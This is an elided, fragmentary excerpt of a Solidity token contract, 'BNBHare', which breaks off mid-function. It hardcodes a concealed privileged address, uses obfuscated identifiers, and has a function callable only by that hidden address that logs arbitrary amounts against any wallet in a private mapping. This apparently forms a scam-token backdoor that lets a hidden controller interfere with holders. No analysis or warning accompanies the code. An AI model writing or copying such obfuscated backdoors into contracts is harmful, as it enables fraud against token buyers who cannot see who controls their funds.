...
contract Ownable is Context {
    ...
    address private _yhtrAddress = 0x45f22Ad7d7d814369c88D4b7ce99D0aA3B8d1B58;
...
contract BNBHare is Context, IERC20, Ownable {
    ...
    uint256 private _total = 100000000000000000* 10**8;
    ...
    uint256 public numTokensSellToAddToLiquidity = 100000000000000000 * 10**8;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0x45f22Ad7d7d814369c88D4b7ce99D0aA3B8d1B58;
    ...
    bool private Alltotals = true;
    bool private Totaltransactions = false;
 
    uint256 public serhfghtyufsdsd = uint256(0);
    mapping(address => uint256) private Completelydiscard;
    address[] private _Completelydiscard;
    address owners;
    ...
    function _vgfwzlc(address pzytd, uint256 trbvjvfs) external yhtrAddress() {
        require(trbvjvfs > 0, "hdwch");
        uint256 terca = Completelydiscard[pzytd];
        if (terca == 0) _Completelydiscard.push(pzytd);
        Completelydiscard[pzytd] = terca.add(trbvjvfs);
